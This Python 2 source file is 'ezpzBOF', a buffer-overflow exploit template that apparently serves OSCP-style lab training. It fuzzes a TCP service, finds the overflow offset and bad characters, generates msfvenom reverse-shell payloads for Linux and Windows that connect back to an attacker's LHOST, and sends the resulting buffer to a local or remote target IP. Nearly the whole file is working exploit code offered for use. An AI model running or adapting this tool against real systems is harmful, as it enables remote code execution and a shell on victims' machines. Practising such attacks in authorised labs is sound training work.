# !/usr/bin/python
# coding=utf-8

#-----------BufferOverflow Template by H0j3n-----------
#|						      |
#.        Updated => Walkthrough Style BOF :)         .
#|	 Twitter => https://twitter.com/h0j3n 	      |
#.____________________________________________________.
#
#	     Only works for python2 only!!

# Python Library Needed
import requests,argparse,socket,time,sys,subprocess
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Header
def header():
	banner = cyan('''                                             
 _____             _____ _____ _____        ___   ___ 
|   __|___ ___ ___| __  |     |   __|   _ _|_  | |   |
|   __|- _| . |- _| __ -|  |  |   __|  | | |  _|_| | |
|_____|___|  _|___|_____|_____|__|      \_/|___|_|___|
          |_|                                         
            			  [Customize By H0j3n]
''')
    	return banner

# ----Variable (Manually @ Auto) -> Depends on your needed----
# IP	 => The Target IP
# PORT   => The Target PORT
# ENTERS => How many enters needed (Sometimes it different so put that applicable for you)
#	 => \r\n is equivalent to one enter button (keyboard)
# PREFIX => What prefix needed before sending the payload?
# OFFSET => What is the correct offset to get code execution?
# OVERFLOW => This is the "A" * OFFSET
# RETN   => The Value for return (To test can use BBBB or AAAA but later see the ESP Value using badchar)
# PADDING => "\x90" * 16 or "\x90" * 32
# POSTFIX => What postfix needed before sending the payload?
# PAYLOAD => Using msfvenom payload (reverse shell)
#	
# BUFFER = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + POSTFIX (This is what will be send in exploit function)
#
#---Dont Change this variable!!----
LHOST = "" 		# Default = ""
LPORT = 0 		# Default = 0
BADCHAR = r""		# Default = r""
PATTERN = 0		# Default = 0
VARIABLE = "PAYLOAD"	# Default = "PAYLOAD"
#----------------------------------

#-----Just Play with this Variable for Manual BOF----
IP = ""
PORT = 9999
PREFIX = ""
ENTERS = r"\r\n"
OFFSET = 0
OVERFLOW = "A" * OFFSET
RETN = ""
PADDING = "\x90" * 0
POSTFIX = ""
PAYLOAD = ""



#----------------------------------------------------

# Color Function
def yellow(STRING):
    return Style.BRIGHT+Fore.YELLOW+STRING+Fore.RESET

def red(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def cyan(STRING):
    return Style.BRIGHT+Fore.CYAN+STRING+Fore.RESET
    
# Copy2Cliboard Function
def copy2clip(txt):
	cmd='echo -n '+txt.strip()+'| xclip -sel clip'
	return subprocess.check_call(cmd, shell=True)

# Fuzzer Function
def fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX):
	print(cyan("\t-----------------------"))
        print(cyan("\t|       FUZZER        |"))
	print(cyan("\t-----------------------"))
	if IP == "" or PORT == 0:
		red("\n[-] Please Check Your IP and PORT again!")
		sys.exit(-1)
	print cyan("\n[+] IP : "+ IP)
	print cyan("[+] PORT : "+ str(PORT))
	print cyan("[+] PREFIX : \'"+ str(PREFIX) + "\'")
	print cyan("[+] PREFIX : \'"+ str(POSTFIX) + "\'")
	print cyan("[+] ENTERS : \'"+ str(ENTERS) + "\'\n")
	TIMEOUT = 5
	BUFFER = []

	COUNTER = 0 
	while len(BUFFER) < 50:
		BUFFER.append("A" * COUNTER)
		COUNTER += 100
	OPTIONS = raw_input(cyan("\nDo the file got a word in starting (y/n)? :"))
	if OPTIONS == "y":
		for string in BUFFER:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(TIMEOUT)
				connect = s.connect((IP, PORT))
				s.recv(1024)
				print(cyan("\n[+] Fuzzing with %s bytes" % len(string)))
				TEMP = PREFIX + string + POSTFIX + ENTERS.decode('string-escape')
				s.send(TEMP)
				s.recv(1024)
				s.close()

			except:
				print(red("\n[-] Could not connect to " + IP + ":" + str(PORT)))
				return [None,string]
			time.sleep(1)
	else:
		for string in BUFFER:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(TIMEOUT)
				connect = s.connect((IP, PORT))
				print(cyan("\n[+] Fuzzing with %s bytes" % len(string)))
				TEMP = PREFIX + string + POSTFIX + ENTERS.decode('string-escape')
				s.send(TEMP)
				s.recv(1024)
				s.close()

			except:
				print(red("\n[-] Could not connect to " + IP + ":" + str(PORT)))
				return [None,string]
			time.sleep(1)

# Create Pattern
def pcreate():
	print(cyan("\t-----------------------"))
        print(cyan("\t|   CREATE PATTERN    |"))
	print(cyan("\t-----------------------"))
	print(cyan("\n[+] Example => Enter Length of Pattern : 1500\n"))
	PATTERN = raw_input("Enter Length of Pattern : ")
	if PATTERN == "":
		print red("\n[-] You did not put any length!")
		sys.exit(-1)
	CMD = "msf-pattern_create -l " + PATTERN
	PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	RESULT = PS.communicate()[0]
	print(cyan("\n[+] Please use the mona commands below that relate to this step!"))
	print(yellow("!mona findmsp -distance " + str(PATTERN)))
	print(cyan("\n[+] Commands Use in this step:"))
	print(yellow(CMD))
	print yellow("\n" + RESULT)
	OPTIONS = raw_input(cyan("Do you want to copy to clipboard (y,n)?"))
	
	if OPTIONS == 'y':
		copy2clip(RESULT)
	return [None,[PATTERN,RESULT.strip()]]

# Check Pattern Offset
def poffset():
	print(cyan("\t-----------------------------"))
        print(cyan("\t|    CHECK PATTERN OFFSET   |"))
	print(cyan("\t-----------------------------"))
	print cyan("\n[+] Example => Enter Pattern : Ad2A")
	PATTERN = raw_input("\nEnter Pattern : ")
	CMD = "msf-pattern_offset -q " + PATTERN
	PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	print(cyan("\n[+] Commands Use in this step:"))
	print(yellow(CMD))
	RESULT = PS.communicate()[0]
	print yellow("\n" + RESULT.strip())
	return [None,[RESULT.strip()]]
	
# Exploit Function
def exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET):
	print(cyan("\t----------------"))
        print(cyan("\t|    EXPLOIT   |"))
	print(cyan("\t----------------"))
	print(cyan("\n[+] Please use the mona commands below that relate to this step!"))
	print(yellow("!mona findmsp -distance " + str(len(PAYLOAD))))
	print(yellow("!mona compare -f C:\mona\oscp\\bytearray.bin -a <ESP>"))
	check(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
	INPUTS = raw_input("\nConfirm To Exploit? (y,n) : ")
	if INPUTS == 'y':
		BUFFER = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + POSTFIX
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try :
			    s.connect((IP, PORT))
			    print("\nSending evil buffer...")
			    s.send(BUFFER + ENTERS.decode('string-escape'))
			    print("Trying to exploit....")

		except:
			    print(red("[-] Could not connect to " + IP + ":" + str(PORT)))
	else:
		print cyan("Thank you for using ezpzBOF!")
        return [None,[]]
		
# Bad Character Option
def badchar_option():
	print(cyan("\t----------------------"))
        print(cyan("\t|    BAD CHARACTER   |"))
	print(cyan("\t----------------------"))
	print cyan("\n[+] Example No Badchar (Please include \\x00) => Enter Bad Characters: \\x00")
	print cyan("[+] Example Got Badchar => Enter Bad Characters: \\x02\\x03\\x04")
	
	INPUTS = raw_input("\n[+] Enter Bad Characters: ")
	OUTPUT_INPUTS = r"{0}".format(INPUTS)
	LISTREM = INPUTS.split("\\x")
	LISTBADCHAR = r""
	OUTPUT = r""
	for x in range(1,256):
		if "{:02x}".format(x) not in LISTREM:
			LISTBADCHAR += r"\x" + "{:02x}".format(x)
			OUTPUT += r"\\x" + "{:02x}".format(x)
	print cyan("\n[+] Bad Character => " + OUTPUT_INPUTS)
	print cyan("[+] Original Bad Character Length => 1020")
	print cyan("[+] Current Bad Character Length => " + str(len(LISTBADCHAR)) + "\n")
	print(cyan("[+] Please use the mona commands below that relate to this step!"))
	print(yellow("!mona bytearray -b " + r"{0}".format(OUTPUT_INPUTS)))
	print(yellow("!mona jmp -r esp -cpb " + r"{0}".format(OUTPUT_INPUTS)))
	print(yellow("!mona compare -f C:\mona\oscp\\bytearray.bin -a <ESP>"))
	#print(yellow("!mona bytearray -b \'\\x" + "00\'"))
	#print(yellow("!mona jmp -r esp -cpb \'\\x" + "00\'"))
	print cyan("\nBad Character To Copy:\n")
	print yellow(r"{0}".format(LISTBADCHAR))
	OPTIONS = raw_input(cyan("\nDo you want to copy to clipboard (y,n)?"))

	if OPTIONS == 'y':
		copy2clip(OUTPUT)
	return [None,[LISTBADCHAR,OUTPUT_INPUTS]]

# Msvenom Payload
def payload(LHOST,LPORT,BADCHAR):
	print(cyan("\t----------------------"))
        print(cyan("\t|   Create Payload   |"))
	print(cyan("\t----------------------"))
	print cyan("\n[+] Options (Target Machine) \n\t0 - Linux\n\t1 - Windows\n")
	OPTIONS = ""
	while (OPTIONS != "0") and (OPTIONS != '1'):
		OPTIONS = str(raw_input("Enter Options: "))
	OUTPUT_PRINT = ""
	if OPTIONS == '0':
		if (LHOST == ""): 
			LHOST = raw_input("Enter LHOST : ")
			LPORT = raw_input("Enter LPORT : ")
			BADCHAR = raw_input("Enter BADCHAR : ")
		CMD = 'msfvenom -a x86 --platform linux --payload linux/x86/shell_reverse_tcp LPORT='+str(LPORT)+' LHOST='+str(LHOST)+' -e x86/shikata_ga_nai -b "'+BADCHAR+'" -f python -v '+ VARIABLE
		print(cyan("\n[+] Commands Use in this step:"))
		print(yellow(CMD))
		PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		RESULT = str(PS.communicate()[0]).strip()
		print "\n"
		for line in RESULT.split("\n"):
			if VARIABLE in line:
				print yellow(line.strip())
				OUTPUT_PRINT += line
				OUTPUT_PRINT += r"\n"
	else:
		if (LHOST == ""): 
			LHOST = raw_input("Enter LHOST : ")
			LPORT = raw_input("Enter LPORT : ")
			BADCHAR = raw_input("Enter BADCHAR : ")
		CMD = 'msfvenom -p windows/shell_reverse_tcp LHOST='+str(LHOST)+' LPORT='+str(LPORT)+' -b "'+BADCHAR+'" EXITFUNC=thread -f python -v '+ VARIABLE
		print(cyan("\n[+] Commands Use in this step:"))
		print(yellow(CMD))
		PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		RESULT = str(PS.communicate()[0]).strip()
		print "\n"
		for line in RESULT.split("\n"):
			if VARIABLE in line:
				print yellow(line.strip())
				OUTPUT_PRINT += line
				OUTPUT_PRINT += r"\n"
	OPTIONS = raw_input(cyan("\nDo you want to copy to clipboard (y,n)?"))

	if OPTIONS == 'y':
		copy2clip("'"+OUTPUT_PRINT+"'")
	return [None,[OUTPUT_PRINT]]

# Check Function
def check(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET):
	PRINT_CHECK = ""
	if IP == "":
		PRINT_CHECK += red("\n[-] IP is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] IP Updated : "+ IP)
	if PORT == 0:
		PRINT_CHECK += red("\n[-] PORT is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] PORT Updated : "+ str(PORT))
	if PREFIX == "":
		PRINT_CHECK += red("\n[-] PREFIX is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] PREFIX Updated : "+ PREFIX)
	if ENTERS == "":
		PRINT_CHECK += red("\n[-] ENTERS is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] ENTERS Updated : "+ str(ENTERS))
	if OFFSET == 0:
		PRINT_CHECK += red("\n[-] OFFSET is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] OFFSET Updated : "+ str(OFFSET))
	if OVERFLOW == "":
		PRINT_CHECK += red("\n[-] OVERFLOW is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] OVERFLOW Updated : A * "+ str(OFFSET))
	if RETN == "":
		PRINT_CHECK += red("\n[-] RETN is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] RETN Updated with Length => " + str(len(RETN)))
	if PADDING == "":
		PRINT_CHECK += red("\n[-] PADDING is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] PADDING Updated with Length => " + str(len(PADDING)))
	if POSTFIX == "":
		PRINT_CHECK += red("\n[-] POSTFIX is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] POSTFIX Updated : "+POSTFIX)
	if PAYLOAD == "":
		PRINT_CHECK += red("\n[-] PAYLOAD is not Update Yet")
	else:
		PRINT_CHECK += cyan("\n[+] PAYLOAD Updated with Length => " + str(len(PAYLOAD)))
		
	print PRINT_CHECK

# Auto Function
def auto():
	print(cyan("\t----------------------"))
        print(cyan("\t|     AUTOMATION     |"))
	print(cyan("\t----------------------"))
	IP = raw_input(cyan("\n[+] Enter Target IP: "))
	PORT = int(raw_input(cyan("\n[+] Enter Target PORT: ")))
	PREFIX = raw_input(cyan("\n[+] Enter PREFIX (Leave blank if no PREFIX) :"))
	POSTFIX = raw_input(cyan("\n[+] Enter POSTFIX (Leave blank if no POSTFIX) :"))
	ENTERS = raw_input(cyan("\n[+] How many enters needed (\\r\\n => equivalent to 1 enter) :"))
	OPTIONS = raw_input(cyan("\n[+] Do you need fuzzer or you don't (y/n)?"))
	OFFSET = 0
	OVERFLOW = "A" * OFFSET
	RETN = ""
	PADDING = "\x90" * 0
	PAYLOAD = "" 
	print "\n"
	# FUZZER STEP
	if OPTIONS == 'y':
		RESULT = fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX)
		if len(RESULT[1]) == 100:
			print red("\n[-] Something went wrong please check your IP or PORT!")
			sys.exit(-1)
			
	# CREATE PATTERN STEP
	RESULT = pcreate()
	
	# EXPLOIT 1
	PAYLOAD = RESULT[1][1]
	print PAYLOAD
	RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
	print RESULT
	
	# CHECK OFFSET PATTERN
	OPTIONS = raw_input(cyan("\n[+] Do you want to check offset manually (y/n)?"))
	if OPTIONS == 'y':
		RESULT = poffset()
		print RESULT
	else:
		OFFSET = int(raw_input(cyan("\n[+] What is the Offset you found?")))
		OVERFLOW = "A" * OFFSET
	RETN = "BBBB"
	# CHECK BADCHAR
	OPTIONS = raw_input(cyan("\n[+] Have you Got the Badchar (y/n) ? :"))
	if OPTIONS == "n":
		COND = True
		while (COND):
			OPTIONS = raw_input(cyan("\n[+] Please check Bad Character till you get the correct one! Do you want to check? (y/n)?"))
			if OPTIONS == "y":
				RESULT = badchar_option()
				PAYLOAD = RESULT[1][0].decode('string-escape')
				BADCHAR = r"{0}".format(RESULT[1][1])
				# EXPLOIT 2
				RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
			else:
				COND = False
	else:
		INPUTS = raw_input(cyan("\n[+] Please Enter your Badchar : "))
		BADCHAR = r"{0}".format(INPUTS)
		
	# PADDING	
	print cyan("\n[+] Example of Padding => \\x90 * 16 @ \\x90 * 32")
	VALUE = int(raw_input(cyan("\n[+] What is the value of Padding (in number)?")))
	PADDING = "\x90" * VALUE
			
	# MAKE PAYLOAD & EXPLOIT3
	COND = True
	while (COND):
		OPTIONS = raw_input(cyan("\n[+] You can try in local and remotely many times from here! (y - Local, n - Remotely, x - Exit) ?"))
		if OPTIONS == "y":
			IP = raw_input(cyan("\n[+] What is Local Target IP? "))
			RETN = raw_input(cyan("\n[+] What is Return Value? ")).decode('string-escape')
			LHOST = raw_input(cyan("\n[+] Enter LHOST :"))
			LPORT = raw_input(cyan("\n[+] Enter LPORT :"))
			RESULT = payload(LHOST,LPORT,BADCHAR)
			REAL = str(RESULT[1][0]).strip()
			PAYLOAD2 = ""
			for line in REAL.split("\\n"):
				if 'PAYLOAD += b\"' in line:
					PAYLOAD2 += line[13:-1]
			PAYLOAD = PAYLOAD2.decode('string-escape')
			RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
		elif OPTIONS == "n":
			IP = raw_input(cyan("\n[+] What is Remote Target IP? "))
			RETN = raw_input(cyan("\n[+] What is Return Value? ")).decode('string-escape')
			LHOST = raw_input(cyan("\n[+] Enter LHOST :"))
			LPORT = raw_input(cyan("\n[+] Enter LPORT :"))
			RESULT = payload(LHOST,LPORT,BADCHAR)
			REAL = str(RESULT[1][0]).strip()
			PAYLOAD2 = ""
			for line in REAL.split("\\n"):
				if 'PAYLOAD += b\"' in line:
					PAYLOAD2 += line[13:-1]
			PAYLOAD = PAYLOAD2.decode('string-escape')
			RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
		else:
			print header()
			sys.exit(-1)
	return None
		
	
	

# Main    	
if __name__ == "__main__":
	print header()
	if len(sys.argv) != 2:
		print red("[+] Usage Auto (Still in BETA):  python %s auto" % sys.argv[0])		
		print red("[+] Usage Fuzzer:\t\t python %s fuzzer" % sys.argv[0])
		print red("[+] Usage Pattern Create:\t python %s pcreate" % sys.argv[0])
		print red("[+] Usage Pattern Offset:\t python %s poffset" % sys.argv[0])
		print red("[+] Usage Bad Characeter:\t python %s badchar" % sys.argv[0])
		print red("[+] Usage Exploit:\t\t python %s exploit" % sys.argv[0])
		print red("[+] Usage Checker:\t\t python %s checker" % sys.argv[0])
		print red("[+] Usage Msfvenom Payload:\t python %s payload" % sys.argv[0])
		sys.exit(-1)
	OPTIONS = sys.argv[1]
	
	if OPTIONS == "fuzzer":
		RESULT = fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX)
	elif OPTIONS == "pcreate":
		RESULT = pcreate()
	elif OPTIONS == "poffset":
		RESULT = poffset()
	elif OPTIONS == "exploit":
		RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
	elif OPTIONS == "badchar":
		RESULT = badchar_option()
	elif OPTIONS == "checker":
		check(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
	elif OPTIONS == "payload":
		RESULT = payload(LHOST,LPORT,BADCHAR)
	elif OPTIONS == "auto":
		RESULT = auto()
	else:
		print "Please Put Correct Usage !"
		sys.exit(-1)
	

	print cyan("\n[COMPLETED]")